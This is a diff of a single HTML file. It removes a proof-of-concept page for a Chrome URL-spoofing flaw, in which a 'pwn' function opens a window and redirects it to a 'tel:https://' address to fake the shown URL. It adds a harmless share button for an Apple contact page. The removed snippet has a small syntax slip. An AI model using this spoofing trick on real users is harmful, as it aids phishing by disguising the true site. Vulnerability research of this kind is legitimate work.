@@ -1,13 +1,1 @@
-<html>
-<head>
-    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
-</head>
-<script>
-function pwn() {
-    w = window.open();
-    w.document.write('<p>Calling Google</p>'));
-    setTimeout("w.location.replace('tel:https://google.com');",5);
-}
-</script>
-<h1><button href="#" onclick="pwn()">CLICK TO CALL</button></h1>
-</html>
+<input onclick="setTimeout(function(){if(navigator.share){navigator.share({title:'Apple Contact',text:'Share this contact page',url:'https://www.apple.com/contact/'}).catch(err=>console.log(err))}else{alert('Sharing is not supported on this browser')}}, 100)" type="button" value="Click here" />
